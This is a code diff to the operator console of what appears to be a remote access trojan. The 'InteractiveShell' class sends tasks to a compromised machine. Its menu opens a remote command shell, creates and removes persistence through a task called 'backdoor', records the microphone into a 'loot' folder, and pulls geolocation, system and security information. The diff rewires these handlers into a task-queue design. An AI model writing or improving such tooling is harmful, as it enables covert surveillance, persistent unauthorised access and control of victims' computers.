@@ -34,21 +34,23 @@ class InteractiveShell:
             command = System.input(4)
             if command == "1":
                 self.shell()
-            # elif command == "2":
-            #     self.upload()
+            elif command == "2":
+                self.create_persistence()
             # elif command == "3":
             #     self.download()
             # elif command == "4":
             #     self.screenshot()
-            # elif command == "5":
-            #     self.cam()
-            elif command == "6":
-                self.mic()
             elif command == "7":
-                self.secinfo()
+                self.remove_persistence()
             elif command == "8":
-                self.geo()
+                self.sysinfo()
             elif command == "9":
+                self.send_notification()
+            elif command == "11":
+                self.secinfo()
+            elif command == "6":
+                self.geo()
+            elif command == "q":
                 break
 
     def send_notification(self):
@@ -96,37 +98,17 @@ class InteractiveShell:
             input("OK")
             print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
-    def geo(self, conn=None):
+    def geo(self):
         self.send_task("geo", "get")
-        try:
-            resp = self.json_receive(self.conn)
-            data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
-        except Exception:
-            data = {}
-        print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
-        input("OK")
+        input("OK\n")
 
-    def secinfo(self, conn=None, address=None):
+    def secinfo(self):
         self.send_task("secinfo", "get")
-        # try:
-        #     resp = asyncio.run(self.get_response())
-        #     data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
-        # except Exception as e:
-        #     print(e)
-        #     input("ok")
-        #     data = {}
-        # Options.print_security_info_text(data)
-        input("OK")
+        input("OK\n")
 
-    def sysinfo(self, conn=None, address=None):
+    def sysinfo(self):
         self.send_task("sysinfo", "get")
-        try:
-            resp = self.json_receive(self.conn)
-            data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
-        except Exception:
-            data = {}
-        print(Options.get_system_info_text(data))
-        input("OK")
+        input("OK\n")
 
     def mic(self, conn=None, address=None):
         records_dir = ensure_project_dir("storage", "loot", "records")
@@ -142,29 +124,21 @@ class InteractiveShell:
     def getInput(self, conn=None):
         send_data(conn or self.conn, b"SHELLINFO")
         return recv_data(conn or self.conn)
-    def shell(self, conn=None, address=None):
-        send_data(conn or self.conn, b"MODE_SHELL")
+    def shell(self):
+        self.send_task("shell", "run")
         try:
             while True:
-                send_data(conn or self.conn, b"SHELLINFO")
-                prompt_text = recv_data(conn or self.conn)
-                cmd = input(prompt_text)
+                cmd = input()
                 if not cmd.strip():
                     continue
                 if cmd == 'exit':
                     System.clear_screen()
-                    send_data(conn or self.conn, b"exit")
+                    self.send_task("shell", "exit")
                     break
-                send_data(conn, cmd.encode())
+                self.send_task("shell", cmd)
                 if cmd == 'clear':
                     System.clear_screen()
-                try:
-                    output = recv_data(conn)
-                    print(Fore.LIGHTGREEN_EX + output)
-                except Exception as e:
-                    print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
-                    input("OK")
-                    break
+                input("OK")
         except Exception as e:
             print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
             input("OK")
@@ -231,22 +205,12 @@ class InteractiveShell:
             input("OK")
         input("OK")
 
-    def backdoor(self, conn, address):
+    def create_persistence(self):
         self.send_task("System", "backdoor")
-        try:
-            resp = self.json_receive(conn)
-        except Exception:
-            resp = None
-        print(Fore.LIGHTCYAN_EX + f"[+] Created Persistence")
         input("OK")
 
-    def delete(self, conn, address):
+    def remove_persistence(self):
         self.send_task("System", "delete")
-        try:
-            resp = self.json_receive(conn)
-        except Exception:
-            resp = None
-        print(Fore.LIGHTCYAN_EX + "[+] Destroyed Persistence")
         input("OK")
 
     def agentinfo(self, conn, address):
